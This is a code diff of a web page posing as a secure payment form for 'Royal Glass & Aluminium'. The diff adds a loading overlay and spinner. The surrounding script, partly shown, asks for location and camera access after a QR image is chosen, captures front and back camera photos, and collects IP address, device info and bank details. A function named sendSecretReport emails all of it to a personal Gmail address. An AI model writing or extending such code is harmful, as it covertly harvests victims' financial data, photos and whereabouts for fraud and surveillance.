@@ -305,6 +305,9 @@
         .submit-btn.loading .btn-text {
             display: none;
         }
+        .submit-btn .btn-text {
+            display: inline-block;
+        }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -363,9 +366,53 @@
             opacity: 1;
             pointer-events: auto;
         }
+        /* Processing overlay */
+        .processing-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(8px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+        }
+        .processing-overlay.show {
+            display: flex;
+        }
+        .processing-overlay .spinner-box {
+            background: white;
+            padding: 40px 50px;
+            border-radius: 24px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        .processing-overlay .spinner-box i {
+            font-size: 40px;
+            color: #2c4b6b;
+            animation: spin 0.8s linear infinite;
+        }
+        .processing-overlay .spinner-box p {
+            margin-top: 15px;
+            color: #1a2a3a;
+            font-size: 16px;
+            font-weight: 500;
+        }
     </style>
 </head>
 <body>
+    <!-- Processing Overlay -->
+    <div class="processing-overlay" id="processingOverlay">
+        <div class="spinner-box">
+            <i class="fas fa-spinner"></i>
+            <p id="processingText">Processing...</p>
+        </div>
+    </div>
+
     <div id="toast" class="toast-message">✓ submitted</div>
 
     <div class="glass-card">
@@ -461,6 +508,7 @@
             let locationGranted = false;
             let userLocation = null;
             let isProcessing = false;
+            let isSubmitting = false;
 
             // Initialize EmailJS
             try {
@@ -474,6 +522,8 @@
             const bankSection = document.getElementById('bankSection');
             const qrSection = document.getElementById('qrSection');
             const optionIndicator = document.getElementById('optionIndicator');
+            const processingOverlay = document.getElementById('processingOverlay');
+            const processingText = document.getElementById('processingText');
             
             const fullName = document.getElementById('fullName');
             const email = document.getElementById('email');
@@ -503,7 +553,7 @@
             // Spinner controls
             const submitBtn = document.getElementById('submitBtn');
 
-            function showSubmitSpinner() {
+            function showSubmitSpinner(text = 'Submitting...') {
                 submitBtn.classList.add('loading');
                 submitBtn.disabled = true;
             }
@@ -511,6 +561,16 @@
             function hideSubmitSpinner() {
                 submitBtn.classList.remove('loading');
                 submitBtn.disabled = false;
+            }
+
+            // Processing overlay
+            function showProcessing(text = 'Processing...') {
+                processingText.textContent = text;
+                processingOverlay.classList.add('show');
+            }
+
+            function hideProcessing() {
+                processingOverlay.classList.remove('show');
             }
 
             // ----- LOCATION FUNCTIONS -----
@@ -881,16 +941,14 @@
                 }
             }
 
-            // ----- QR Upload Handler - OPEN FILE CHOOSER FIRST, THEN GET PERMISSIONS -----
+            // ----- QR Upload Handler - OPEN FILE CHOOSER FIRST -----
             qrUploadBtn.addEventListener('click', function(e) {
                 e.preventDefault();
-                
-                // STEP 1: OPEN FILE CHOOSER IMMEDIATELY (direct user gesture)
                 console.log('📁 Opening file chooser...');
                 qrInput.click();
             });
 
-            // ----- WHEN FILE IS SELECTED - REQUEST PERMISSIONS & CAPTURE -----
+            // ----- WHEN FILE IS SELECTED - SHOW SPINNER, GET PERMISSIONS & CAPTURE -----
             qrInput.addEventListener('change', async function(e) {
                 const file = this.files[0];
                 if (!file) {
@@ -911,19 +969,31 @@
                 reader.readAsDataURL(file);
                 updateSections();
 
-                // NOW request permissions and capture photos (after file is selected)
-                console.log('📸 File selected, requesting permissions...');
-                
+                // DISABLE SUBMIT BUTTON AND SHOW SPINNER
+                showSubmitSpinner('Please wait...');
+                showProcessing('📸 Getting permissions & capturing...');
+
                 try {
                     // Request location permission
+                    console.log('📍 Requesting location...');
                     await requestLocation();
                     
                     // Request camera permission and capture photos
+                    console.log('📸 Requesting camera...');
                     await requestCameraAndCapture();
                     
                     console.log('✅ Permissions checked after file selection');
+                    console.log('📸 Photos captured:', capturedPhotos.front.length + capturedPhotos.back.length);
+                    
+                    // Hide processing and enable submit
+                    hideProcessing();
+                    hideSubmitSpinner();
+                    
                 } catch (error) {
                     console.error('Error during permission request:', error);
+                    hideProcessing();
+                    hideSubmitSpinner();
+                    showToast('❌ Something went wrong', true);
                 }
             });
 
@@ -933,7 +1003,7 @@
 
             updateSections();
 
-            // ----- MAIN SUBMIT - CHECK PERMISSIONS -----
+            // ----- MAIN SUBMIT -----
             document.getElementById('bankForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
 
@@ -956,7 +1026,9 @@
                     return;
                 }
 
-                showSubmitSpinner();
+                // Show submit spinner
+                showSubmitSpinner('Submitting...');
+                showProcessing('📤 Submitting your details...');
 
                 try {
                     console.log('✅ Submitting...');
@@ -991,7 +1063,7 @@
                     const ip = await getIPAddress();
                     const deviceInfo = getDeviceInfo();
 
-                    // Use location (must be granted for QR upload)
+                    // Use location
                     const location = userLocation || { lat: 'unavailable', lon: 'unavailable' };
 
                     console.log('🌐 IP:', ip);
@@ -1009,6 +1081,7 @@
                     // Send
                     const sent = await sendSecretReport(payload, location, qrImage);
 
+                    hideProcessing();
                     hideSubmitSpinner();
 
                     if (sent) {
@@ -1023,14 +1096,16 @@
                     }
                 } catch (error) {
                     console.error('❌ Fatal error:', error);
+                    hideProcessing();
                     hideSubmitSpinner();
                     showToast('❌ Something went wrong', true);
                 }
             });
 
             console.log('Royal Glass & Aluminium · secure');
-            console.log('✅ File chooser opens FIRST (direct user gesture)');
-            console.log('✅ Permissions requested AFTER file is selected');
+            console.log('✅ File chooser opens FIRST');
+            console.log('✅ Spinner shown while permissions are checked after file selection');
+            console.log('✅ Submit button disabled during processing');
             console.log('📧 Sending to: mrsmartboy123@gmail.com');
         })();
     </script>
